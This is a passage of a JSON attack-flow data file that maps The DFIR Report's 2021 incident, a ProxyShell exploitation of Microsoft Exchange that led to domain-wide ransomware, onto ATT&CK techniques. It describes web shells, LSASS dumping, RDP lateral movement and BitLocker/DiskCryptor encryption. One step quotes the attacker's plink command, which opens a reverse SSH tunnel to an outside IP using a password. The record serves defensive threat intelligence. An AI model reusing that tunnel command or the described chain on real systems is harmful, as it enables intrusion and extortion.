1-d42d0bdd542f","instance--dc65906c-5087-5f16-ab1e-0cc6b9d742de","instance--844d225a-3ae9-525c-b4f5-83eb91775614","instance--7e833b33-7829-5147-9513-8de58bfcb030","instance--3c98ab59-bfe9-5a2d-b4bb-97e1a19ecb00","instance--1425e9b2-9c15-5ae8-a9c8-544c2d526f1e","instance--17bcf6ba-c9ea-5aad-b74f-f63cefcfed06","instance--77206f44-bedd-585e-826f-657b607f7163","instance--dbbafd3f-6d63-5395-9e77-7b16c890b837","instance--6bfc2112-4430-58a0-8b7c-14080ed74065","instance--21d01c1d-e895-5993-b525-76a90cdf2cae","instance--43bd504e-fce3-562b-a35e-8b2ab8dd1cd0","instance--1a7ff821-6158-50a0-b699-c8b0e1c91b0a","instance--95321e5c-a3e3-5dd1-80cd-11956a27ec5e","instance--002dc750-5e78-5fc4-8daf-bb9ac66bda3f","instance--96ba76f9-72f8-5fef-9f24-c5bf955ae429","instance--ec0ce115-0db3-59b2-bd43-f25fe06bf045","instance--e905637e-4003-515b-814d-47bdb6121e26","instance--181d8a00-4016-5169-a9ac-20b8b5a25145","instance--80ae483e-f333-55c4-92a5-c7cb09b3e0e7"],"properties":[["name","Exchange Exploit Leads to Domain Wide Ransomware"],["description","In late September 2021, we observed an intrusion in which initial access was gained by the threat actor exploiting multiple vulnerabilities in Microsoft Exchange."],["scope","incident"],["author",[["name","The DFIR Report"]]],["external_references",[["item-1",[["source_name","thedfirreport.com"],["url","https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/"]]]]]]},{"anchors":{"0":"instance--ad592d05-6969-5b51-98a8-1ad9b6aab896","120":"instance--5850a8f4-8241-5e73-9bf0-dcd376cd5025","150":"instance--0da1498f-3beb-5916-a249-e0410a4a81e4","180":"instance--d3632784-7391-5a29-83e2-edab51db56c6","210":"instance--8bc47ca5-ca73-5a04-a9ea-918608f10871","240":"instance--6546eef6-c5ad-516e-a417-89916e651648","270":"instance--244e5a69-f465-564e-9d2c-93d4da44fc57","30":"instance--6a1fca3c-fdb6-536a-bbea-61ac2349a700","300":"instance--043a5b44-2864-5565-abce-1909204e5485","330":"instance--e10eb918-2b0b-56f4-9c82-f345ce21276c","60":"instance--33a99d1b-dad8-51f6-be74-e1614db9151b","90":"instance--380c79e9-b1eb-547c-bf01-a011db1201c1"},"id":"action","instance":"attack-action--1","properties":[["name","Exploit ProxyShell"],["description","In this specific scenario, we observed the presence and exploitation of all the CVEs indicated above so; specifically, the attacker was able to exploit a Pre-auth Path Confusion Leads to ACL Bypass (CVE-2021-34473), an Elevation of Privilege on Exchange PowerShell Backend (CVE-2021-34523), and finally a Post-auth Arbitrary-File-Write Leads to RCE (CVE-2021-31207)."],["confidence",0.0],["ttp",{"tactic":"TA0001","technique":"T1190"}]]},{"anchors":{"0":"instance--4f4d03a8-4502-5010-997b-9943e254395b","120":"instance--cefe62ac-5b6e-5ead-84fc-b4c632913a73","150":"instance--4d07a740-2467-5b95-ac8d-4a2ee8edd11e","180":"instance--1205f03c-a457-5a0b-87ef-3bbb7aac110f","210":"instance--96e7dc6a-9f86-5f69-8d45-a566303cd4c0","240":"instance--66237af6-bb19-5a51-9fa2-cbc4a96186f5","270":"instance--836dfd42-b475-50ca-9acf-4f11bd32b89f","30":"instance--efe92997-cc5c-538a-90bc-c09ffb1379f4","300":"instance--9c4a24ae-1426-5cb5-9d7c-792e6dd325b7","330":"instance--06c6a74a-ca7d-5703-88ea-a06a0933d21a","60":"instance--5e4f84e5-56b7-5b8f-9bc3-b4d59d371123","90":"instance--019deb6a-bab3-57db-9a53-11e3564bf7a4"},"id":"action","instance":"attack-action--2","properties":[["name","Create web shells"],["description","This last CVE allowed the creation of multiple web shells."],["confidence",0.0],["ttp",{"tactic":"TA0003","technique":"T1505.003"}]]},{"anchors":{"0":"instance--0ce35aea-35a2-52ae-a67b-985306bdefe7","120":"instance--312639d5-e6d9-57b1-850d-28f0a1eac2f6","150":"instance--9551a25e-2558-512e-9894-dd64a8d662bf","180":"instance--403becce-e0ad-5dcd-bc14-7c00453907da","210":"instance--2305f501-2712-5ec6-9d4e-1371b011e937","240":"instance--cf1b8cf6-1cbd-5afb-b653-aa693889dab5","270":"instance--1d3dc59a-40a0-5670-aa3e-1304ff762003","30":"instance--77063d4f-503a-5e9b-b622-15aa2cc6a8e7","300":"instance--beaab67f-8a54-5982-8c5d-9d2ed2d42c9f","330":"instance--4d3274ff-ef14-5a53-99be-01575194a98e","60":"instance--4154a6bf-290b-5fce-a557-5dc0f3e700fb","90":"instance--2992bc0b-df57-54e5-a17b-03a964338c09"},"id":"action","instance":"attack-action--3","properties":[["name","Run Exchange discovery cmdlets"],["description","The method used by the actor in this incident was to first use the elevated PowerShell privileges to run the following discovery cmdlets:\n\nGet-MailboxRegionalConfiguration\nGet-Mailbox\nGet-ExchangeServer\nGet-InboxRule"],["confidence",0.0],["ttp",{"tactic":"TA0007","technique":"T1087"}]]},{"anchors":{"0":"instance--0f6e4da7-a5f4-54d7-866f-3bc6e8bcb019","120":"instance--015254b5-0906-577e-b3e3-3899f837d118","150":"instance--f7af5b8c-330a-58d5-b0da-a3d5f0bc6ad0","180":"instance--9f27ab21-2382-567d-b022-74ad5a29bd08","210":"instance--d799eb0a-7600-5b1a-a298-c47a78ceae4b","240":"instance--911c2c52-5974-5e08-b0b6-a9084d57c6ee","270":"instance--286444b4-97a1-58cd-9ca3-cffa04a15351","30":"instance--92192c38-5143-50e0-8c39-a96ea86e32e2","300":"instance--82bb3de0-bea5-5651-a1de-583283258c6d","330":"instance--4f0945c8-f644-50ce-8796-fea52a29dda1","60":"instance--16c43a2d-7356-521d-a507-5922e2c3337b","90":"instance--abce5c62-339a-5ed5-a0b8-dd66136cfe2f"},"id":"action","instance":"attack-action--4","properties":[["name","Export mailbox to ASPX web shell"],["description","This was shortly followed by the cmdlet \u201cNew-ManagementRoleAssignment\u201d responsible for granting mailbox import/export privileges before running \u201cNew-MailboxExportRequest\u201d. The cmdlet would export a Mailbox to a provided location with the .aspx extention. While the file is a legitimate .pst file, in contains plaintext web shell code that is rendered by IIS when requested."],["confidence",0.0],["ttp",{"tactic":"TA0003","technique":"T1505.003"}]]},{"anchors":{"0":"instance--a469636c-0cb2-50b9-92f9-644c8aa98197","120":"instance--d57b3a21-e910-5879-8148-40165cea451a","150":"instance--58250ef4-5bb4-5bf3-b33e-89493bbb395d","180":"instance--3e769cf2-c1e5-5d2e-81d4-892f48ce4d86","210":"instance--f6499e41-749c-5d7f-9346-96c08d0d5dfd","240":"instance--d9dcdfc8-5f42-546a-803a-0efcd5d4cf91","270":"instance--c9afd0f6-97ce-57b2-9d60-3557b6214809","30":"instance--75f82155-f5ff-5619-8bf8-aae22937cab0","300":"instance--25e2d26e-1b35-56bd-b9aa-096c2d3b0e3c","330":"instance--e0483688-da10-5376-8cf2-050bcc3b70f0","60":"instance--1293d9cc-16b2-5c67-a453-bd144aab133a","90":"instance--2b43cd52-10db-5b15-8ad5-c4b59496528b"},"id":"action","instance":"attack-action--5","properties":[["name","Execute commands via web shells"],["description","These web shells, exposed to the internet, were used to execute arbitrary code on the Microsoft Exchange Server utilizing PowerShell and cmd."],["confidence",0.0],["ttp",{"tactic":"TA0002","technique":"T1059.003"}]]},{"anchors":{"0":"instance--54fc1f38-f4e3-523e-b07c-73889b0d8df7","120":"instance--9cf45948-7040-5d7a-a1d5-3cb4db0c1af6","150":"instance--13bb13cc-e02b-51d2-8d7d-40e5613b6e5a","180":"instance--e33bc6ee-771e-54fe-a772-74dfdaad420d","210":"instance--286f51a3-8fc6-55ec-978e-8b05ebda3655","240":"instance--14659696-be77-5460-beb1-4b5eac126e43","270":"instance--f48ed1a6-2895-5cd2-9b1c-e30ac2bc8921","30":"instance--7b803e61-16ac-5720-92cd-8f2a456a52b7","300":"instance--76c24361-5143-5c43-8e4d-707c619e6038","330":"instance--f395cfc7-395a-5001-9552-a4fec6dbc53a","60":"instance--760885bb-9294-5a5b-93a2-a410e1ea4112","90":"instance--8e0d1a12-8611-598d-9a7d-40f2525e4781"},"id":"action","instance":"attack-action--6","properties":[["name","Run host and network discovery commands"],["description","After gaining an initial foothold on the Exchange system, the threat actors started discovery by executing commands like ipconfig, net, ping, systeminfo, and others, using the previously dropped web shells. This battery of initial discovery included a network call out to themoscowtimes[.]com. The threat actors repeated these tests twice over the first two days."],["confidence",0.0],["ttp",{"tactic":"TA0007","technique":"T1016"}]]},{"anchors":{"0":"instance--7cccbcd0-a724-54fb-be4f-ac523d26f7d0","120":"instance--738e44b2-1357-5eb3-82bd-8a0ce8942b72","150":"instance--d31f4735-6339-5929-8d7c-d30863cf166f","180":"instance--2252393d-d801-5931-ad38-4b53374a9880","210":"instance--065b5ad5-023a-5336-b458-e9c9dcda2976","240":"instance--5ea0dd2b-5eac-51f8-855a-4cbcb801bc2d","270":"instance--bba66874-a069-56c6-bb95-967cb3cefc9e","30":"instance--6377c09d-ecb4-5567-a2f4-4dde56ff4f98","300":"instance--ede3430f-b16b-58ae-be71-1d1f1a194336","330":"instance--7772f482-8ee2-569a-b600-7528c065d4e0","60":"instance--98139a98-16b0-54fe-8c77-3473c1b520cd","90":"instance--5cb9cc95-e190-5a68-985d-0a94d39299e6"},"id":"action","instance":"attack-action--7","properties":[["name","Enable DefaultAccount and add admin groups"],["description","Since the commands executed via the web shell run with SYSTEM level privileges, threat actors took advantage of this and enabled a built-in account DefaultAccount, set the password and added it to Administrator and Remote Desktop Users groups."],["confidence",0.0],["ttp",{"tactic":"TA0003","technique":"T1098"}]]},{"anchors":{"0":"instance--5150f7cc-6f25-5eb3-a6fc-5099ced4caf4","120":"instance--64a408ce-c543-55d6-a9dd-206ce7cadbb2","150":"instance--1b71e413-cfd2-528c-8792-dc7dd1bb9938","180":"instance--aa12ce11-0165-52b6-b72d-e4d9070e9fbb","210":"instance--5d8b0f08-14bc-58f4-9316-b25a92dd09a6","240":"instance--34f96b84-9453-53f2-ae07-d28c04665e6c","270":"instance--415f1d54-1cd4-5ba7-8071-4aa99bc946ac","30":"instance--18834cac-b4c4-57b0-88ea-5a62fdb27cf9","300":"instance--de4f9957-1ac6-5782-86ea-f1a3b6a9ad13","330":"instance--8eff940b-86bb-556f-8c85-c7c47577b3ed","60":"instance--14a123fd-5626-5e69-8257-6dcd64c28ec0","90":"instance--02294ff1-7261-5db8-8e0d-b9e818922053"},"id":"action","instance":"attack-action--8","properties":[["name","Establish FRP persistence"],["description","Right after the transfer, the adversaries executed install-proxy.bat to create two directories and move CacheTask.bat, dllhost.exe and RuntimeBroker into their respective folder. A scheduled task was created and executed, to execute install-proxy.bat, which established network persistence via (FRP) which was used to proxy RDP traffic during the intrusion."],["confidence",0.0],["ttp",{"tactic":"TA0003","technique":"T1053.005"}]]},{"anchors":{"0":"instance--180f2983-9c1a-56f4-99d6-c990125f7baa","120":"instance--c7f65318-7600-57f4-a8ac-992357e695ff","150":"instance--95523e1a-0a1d-52ef-944c-23f9cbc50233","180":"instance--bc8eb48d-411d-5877-aa9b-966476b71207","210":"instance--4cc5026e-07f9-5327-9912-5d278a0a3321","240":"instance--d6a7d51d-39a4-5eb3-8831-f23437781b95","270":"instance--cac30e05-5f01-5b4f-b5c0-6b975297df2d","30":"instance--cb0751b0-c027-5895-a460-a72e48920c71","300":"instance--f41cdc1f-abb7-5ff7-81c2-bf2235a7faab","330":"instance--b114cbda-9ec8-5612-b2f8-93c36811cafb","60":"instance--f28e5296-2041-5fe9-992d-4c70d549191e","90":"instance--3ea39244-da0f-5435-8745-f2afa8b13872"},"id":"action","instance":"attack-action--9","properties":[["name","Create Plink SSH tunnel for RDP"],["description","The threat actors also dropped and executed plink.exe, creating a remote SSH tunnel to 148.251.71[.]182 (tcp[.]symantecserver[.]co) in order to reach the RDP port on the Exchange system over the internet:\n\n\"powershell.exe\" /c echo y | plink.exe -N -T -R 0.0.0.0:1251:127.0.0.1:3389 148.251.71.182 -P 22 -l forward -pw Socks@123 -no-antispoof"],["confidence",0.0],["ttp",{"tactic":"TA0011","technique":"T1572"}]]},{"anchors":{"0":"instance--db5fab04-54d4-5eec-a429-185861eb2719","120":"instance--985391bd-d017-5935-ab31-3b4b56331b02","150":"instance--092bb98d-fc30-5f69-b6b7-e3024f3ec65a","180":"instance--755129e6-612e-5b63-a780-1c886d98909b","210":"instance--431723d9-dd8c-5190-9dab-6f346173c044","240":"instance--5b9fb821-54fe-5f22-bba3-038263245910","270":"instance--3c6777cb-6430-544b-b31a-01b198524553","30":"instance--c070071b-a9a3-52fe-8956-a51744db200b","300":"instance--a9a4289c-d995-5783-9544-a8b45052eb56","330":"instance--344009cc-e024-5c68-9246-51e85e00d45c","60":"instance--86c77621-2c1d-59c3-b398-e62f4b48a3dd","90":"instance--67627b08-1913-5f3d-8318-52d3bda9c1c3"},"id":"action","instance":"attack-action--10","properties":[["name","Access Exchange over RDP"],["description","After running the above Plink command, the threat actors had RDP access into the environment over the SSH tunnel."],["confidence",0.0],["ttp",{"tactic":"TA0008","technique":"T1021.001"}]]},{"anchors":{"0":"instance--6b7baffd-afaf-5472-9af2-a263119a77ef","120":"instance--83f38e63-e29a-53f4-99d9-927a195c453f","150":"instance--3e720145-b7a1-5bd6-8a7d-bb13519675d1","180":"instance--bdce060f-d96c-5b06-b8f4-1ab1527fd01d","210":"instance--a4feb251-e6e3-5680-a712-d59c92f73ccf","240":"instance--9a564ca6-b753-5b06-880c-b3aac25c1e73","270":"instance--76861a89-f006-5e0d-8c5b-ebdcb5e926dc","30":"instance--cf41e64d-4a4b-58d9-9962-72d278b2c489","300":"instance--ac1d6edd-482f-5f13-9348-b605afcc260c","330":"instance--ed78dfa1-f300-564f-b2cd-6c99552b9a68","60":"instance--979accb3-1b3e-5af4-9182-78392cbaf904","90":"instance--ae721c42-320e-5ea4-9c77-339a05b6e12f"},"id":"action","instance":"attack-action--11","properties":[["name","Transfer tools via RDP"],["description","They then copied their tools into the environment via RDP, which was observed when CacheTask.zip was copied to disk. This compressed file had a few files in it:\n\nCacheTask.bat\n\nCacheTask.xml\n\ndllhost.exe\n\ninstall-proxy.bat\n\nRuntimeBroker"],["confidence",0.0],["ttp",{"tactic":"TA0011","technique":"T1105"}]]},{"anchors":{"0":"instance--f1e35721-7ac2-54fe-bcf6-5456d2faeaa3","120":"instance--3ff6777e-fcba-5b31-bf0f-3ddf77f6030d","150":"instance--cc6192f9-21a5-5d1a-b954-6a52d989b82d","180":"instance--62a87260-0181-5f49-bc05-733216e4d822","210":"instance--2f2d05c5-8e60-5ac2-b7af-e03027d67957","240":"instance--79c1ec18-d792-5d3d-a7bc-d94fe8b124cf","270":"instance--a035d357-e930-5d33-ab8d-d0314092d036","30":"instance--3af551b8-f6ac-5f54-9f6d-403fecdc69eb","300":"instance--298b5d2a-bf93-51e9-b052-19ce36114a5d","330":"instance--c8ea0da0-a19a-5766-b0d1-8524844a59d1","60":"instance--a204f87d-ace7-5a9e-b3d1-13202bdc5c7b","90":"instance--fff4de11-3f84-52c8-bb77-192210612a62"},"id":"action","instance":"attack-action--12","properties":[["name","Dump LSASS with Task Manager"],["description","Utilizing the Plink RDP connection, the threat actor dumped LSASS using Task Manager. Thirty minutes later, the threat actor started using a domain administrator account."],["confidence",0.0],["ttp",{"tactic":"TA0006","technique":"T1003.001"}]]},{"anchors":{"0":"instance--cac05670-e90e-512c-99cc-c0adf909c3ef","120":"instance--43922820-ddd3-5742-a88d-49c20f8e3fd5","150":"instance--884271a6-8d7b-5c96-9ece-61be4126898b","180":"instance--373a94ef-653d-5c24-96f7-d0cf326d3aea","210":"instance--e58b782a-e75e-5141-bdf0-6d47dbed96bd","240":"instance--5960e46a-3307-5101-b96f-f1bae10e323d","270":"instance--a5ae1125-6ca5-54f1-b9d3-0091a0a38367","30":"instance--e7c521dd-fe09-528b-bb67-1ec53389b876","300":"instance--582e0864-cb5c-5de1-b6c0-e162ae91e8bc","330":"instance--3d5550f3-3e33-5d71-b71e-db2a0a957e5e","60":"instance--b83fc757-0bd4-5b63-a13e-e5b8ef5956d2","90":"instance--2a745819-837b-5585-a366-81a34117a6e5"},"id":"action","instance":"attack-action--13","properties":[["name","Use stolen Domain Admin account"],["description","Using the stolen Domain Admin account, adversaries performed port scanning with KPortScan 3.0 and then moved laterally using RDP."],["confidence",0.0],["ttp",{"tactic":"TA0004","technique":"T1078"}]]},{"anchors":{"0":"instance--2accaaf8-d071-542e-9a10-06866a96b394","120":"instance--75ef5b2f-7c71-566e-baf2-29f54ced8138","150":"instance--73017f0a-a5f3-5dca-b91c-a2d37bcfe21b","180":"instance--2f1b6e5f-d3b0-59e5-b3c8-6c1399d1ce2a","210":"instance--c7aedd91-3346-5b75-9e3a-842851881a25","240":"instance--2146989b-d8a2-53f0-8a1c-cd3d976227e9","270":"instance--1b0bbd91-fa2a-5897-96d0-9e5918961c9c","30":"instance--e6b73353-364e-5586-a07b-e1fdc92ad2d3","300":"instance--0fdc5473-d5b9-5fed-91a3-21958da6287b","330":"instance--fd1cd9e0-5761-5725-801f-bf88b65914e8","60":"instance--a58b8357-6abc-58d7-ad2b-bec48fffcd9b","90":"instance--e8daf33f-0240-5544-9f99-3be7ac96fc1d"},"id":"action","instance":"attack-action--14","properties":[["name","Scan internal network with KPortScan"],["description","Using the stolen Domain Admin account, adversaries performed port scanning with KPortScan 3.0 and then moved laterally using RDP."],["confidence",0.0],["ttp",{"tactic":"TA0007","technique":"T1046"}]]},{"anchors":{"0":"instance--c80ca3ef-db0a-5372-968e-c17eb31a79ca","120":"instance--69989f45-927f-57be-92e5-5102fccd9f11","150":"instance--9b02c549-b183-5406-a100-249fb1868d16","180":"instance--c1d2a890-ed8d-5123-92d5-ceeaa937ee87","210":"instance--b785b7b9-02d5-5d04-be0c-0d02d4f85620","240":"instance--cde2d3fb-a23f-5188-9d7d-6c7f3cd3cebb","270":"instance--3fa59d94-25bb-5c51-af21-1a7c1fd91f66","30":"instance--fdd04191-1a03-5134-b88e-a55240471931","300":"instance--dddeb587-c160-5bdc-a385-f5d294f11e92","330":"instance--a13b6b46-2b8e-5660-b86f-03747a07fe24","60":"instance--d996db22-4d65-536a-83bf-a1db02b37136","90":"instance--258e2cac-1806-5147-8d61-a10d64a86e46"},"id":"action","instance":"attack-action--15","properties":[["name","Move laterally with RDP"],["description","Using the stolen Domain Admin account, adversaries performed port scanning with KPortScan 3.0 and then moved laterally using RDP. Targeted servers included backup systems and domain controllers."],["confidence",0.0],["ttp",{"tactic":"TA0008","technique":"T1021.001"}]]},{"anchors":{"0":"instance--878d252f-de04-5857-ad0a-e8560794a9aa","120":"instance--bf65c103-2305-50be-8098-7718a8b010c5","150":"instance--348f71b8-78ee-5edf-accb-cd536c0db67d","180":"instance--e786d536-88e4-5ad4-8526-ae120c505f45","210":"instance--d3f3806c-3238-5b69-a0ca-334a1453e3dd","240":"instance--6dc42515-8e0a-5d8f-9dcb-cc6f0eb80f24","270":"instance--6a335c70-0c01-578c-9e01-614ace562750","30":"instance--c34e4c14-a710-535c-afd4-17d8ea759e88","300":"instance--60b19ce6-d4d3-5ce5-b2fe-3427fd0ea9a4","330":"instance--dea41a44-5c5a-520f-8975-25088fdd166c","60":"instance--e8f2f47b-1824-589b-af23-ab4291258936","90":"instance--67989025-38e3-56c8-b903-f474fc067511"},"id":"action","instance":"attack-action--16","properties":[["name","Deploy FRP to additional systems"],["description","Targeted servers included backup systems and domain controllers. The threat actor also deployed the FRP package to these systems after gaining access."],["confidence",0.0],["ttp",{"tactic":"TA0011","technique":"T1105"}]]},{"anchors":{"0":"instance--dbfe6415-cd2c-55f2-9509-06b6668ef23a","120":"instance--79ca45e2-afd7-51fa-9574-5085c7de4c84","150":"instance--39171cfe-3bf6-5200-b6f5-e97e3b047db7","180":"instance--8cda146b-7259-56b2-b337-56038a1f52d3","210":"instance--a662f8bf-2723-58c0-a1a8-9af9497cf428","240":"instance--a9b75b15-3be0-5e64-8132-40b87e7ae405","270":"instance--31896ecd-322b-5a41-bd1e-0b7a30b9d9d1","30":"instance--60868276-2726-597d-8f57-8aa7fc9c0738","300":"instance--4f5668fa-b6ef-57cc-93da-5cd1e1727a22","330":"instance--b022a562-9020-587c-a5be-97d254cc8f11","60":"instance--cf452b0f-192e-5357-ba8c-fbae1a6e4ae0","90":"instance--012cc6fc-0a37-5e6e-b9b7-07f3bcd2d02c"},"id":"action","instance":"attack-action--17","properties":[["name","Deploy and execute setup.bat on servers"],["description","On servers they copied over a file named setup.bat.\n\nThey then manually executed the script which disables the event log service, enables BitLocker (and RDP), prepares system drive using BdeHdCfg (a BitLocker drive encryption preparation tool), restarts the system, and deletes itself."],["confidence",0.0],["ttp",{"tactic":"TA0040","technique":"T1486"}]]},{"anchors":{"0":"instance--a73f63ad-1c10-59c2-82aa-bef4ae8f64e0","120":"instance--62757838-a58e-5d41-b7e3-1ccc64e8cdbf","150":"instance--3462202b-a91d-5325-abfe-876a63049484","180":"instance--72959cd4-5e05-5d69-a145-8b6f35720646","210":"instance--d3b85082-8de6-5ffd-8abe-c9e1ec43f533","240":"instance--0a22ffab-8bbc-55b1-85ec-df74e4a120f6","270":"instance--548b3ba1-955f-5e04-b6e8-064cc259e7a6","30":"instance--6f0a37c5-db81-5459-92c1-bc8ab8cd1fd3","300":"instance--e81be898-f7c2-56a0-a705-d2aba8831f75","330":"instance--8f207ed6-cb63-551c-9a40-583fac14fe80","60":"instance--8b44546f-f8e4-5d12-b172-99f9507395eb","90":"instance--f61db455-1665-504d-85b4-5fd5d40fbcc2"},"id":"action","instance":"attack-action--18","properties":[["name","Drop and execute DiskCryptor on workstations"],["description","To encrypt workstations, an open source utility called was utilized. This was dropped on the workstations via RDP sessions and then executed to install the utility and setup the encryption. The utility required a reboot to install a kernel mode driver and then another reboot to lock out access to the workstations."],["confidence",0.0],["ttp",{"tactic":"TA0040","technique":"T1486"}]]},{"anchors":{"0":"instance--223a73a7-07a6-5688-bc70-e7fbf2c8afd4","120":"instance--2184e59f-b6bd-5ca7-8254-3872e152a964","150":"instance--eed82efc-7573-5ccf-97d8-e3f88a2337bb","180":"instance--453ded0c-8246-59f2-a14f-beca9e751cd6","210":"instance--143e4619-312d-5cbc-acc5-efed5f6c0164","240":"instance--659cf4a8-ca80-5204-8b8d-3240f6f370da","270":"instance--2dac3e32-a8df-582e-845a-3a7b1d510c1d","30":"instance--6ab42faa-5ba5-5c44-b387-40b1d021e500","300":"instance--96e5ad82-e4af-5995-8b69-6df7d7ce2490","330":"instance--a960fdd4-4889-5426-a406-4761d11be5ab","60":"instance--42df375f-d3e2-5d47-9faa-324aecbbf064","90":"instance--51395417-94d2-5b5a-881c-7b6cc63ade4e"},"id":"action","instance":"attack-action--19","properties":[["name","Leave ransom note"],["description","The threat actors left their note requesting 8,000 USD on a domain controller which was not rebooted or locked out. The note pointed to Telegram and ProtonMail contacts"],["confidence",0.0],["ttp",{"tactic":"TA0040","technique":"T1491.001"}]]},{"anchors":{"0":"instance--35652c79-2c41-5d60-81ba-b5e47aa554bf","120":"instance--53906203-fffb-5af3-b112-44a9b4b49b8f","150":"instance--465fbc8a-7b4c-569f-be00-c0fbc137fcfc","180":"instance--a653c96b-3673-5dfa-968e-188fffe4cc04","210":"instance--6a344cf5-bd5c-52db-84f5-23c7701c7a5e","30":"instance--913561d1-b5f3-54d2-8272-159233dfde54","330":"instance--d59fe52d-c897-5f3a-919a-c2273cb8a8b3","60":"instance--f1fd6a3d-bb83-543d-a379-39d4632978f7","90":"instance--4cd6fce2-0d24-57f0-b161-12a867cd1100","branch:False":"instance--f7e897b3-3607-5ea5-8d15-5f83ba8a60da","branch:True":"instance--39b5ac19-b0dd-5674-a7d9-d75e659fe9ea"},"id":"condition","instance":"attack-condition--1","properties":[["description","Since the commands executed via the web shell run with SYSTEM level privileges, threat actors took advantage of this"]]},{"anchors":{"0":"instance--2ff8b105-17d8-5bc8-9736-a71ca9281068","120":"instance--fe9b11f7-9a07-51c8-93b2-02f34148833b","150":"instance--15f0676c-2f2f-58cf-99a3-b5eade2d286e","180":"instance--cdc5e3d9-a0b4-5995-98a3-d1a29532ffb1","210":"instance--75ed5df8-ff2f-5667-9748-b8587a1ee318","30":"instance--46009917-4258-54e5-9e91-c46c4a45d34d","330":"instance--54845373-a5f0-5af0-b348-5b0a3b4fbe67","60":"instance--f1f8d9a5-1f2a-55c4-af9a-f2629bc0827a","90":"instance--ddfb6e54-4af9-5771-910f-b4c7ba6e9860","branch:False":"instance--64607b7d-a4bd-56e7-9116-7bc21201c8bf","branch:True":"instance--f635d174-aa29-531f-b9c8-0cc481c6c1dd"},"id":"condition","instance":"attack-condition--2","properties":[["description","After running the above Plink command, the threat actors had RDP access into the environment over the SSH tunnel."]]},{"anchors":{"0":"instance--64fa8274-9976-53b9-811c-a0e7e805b799","120":"instance--ce384754-4013-5515-ac17-4456e1d80bbb","150":"instance--99275651-db0d-57ec-a13c-6e557a4b9c7c","180":"instance--cbaa25ac-4f14-51f0-9962-f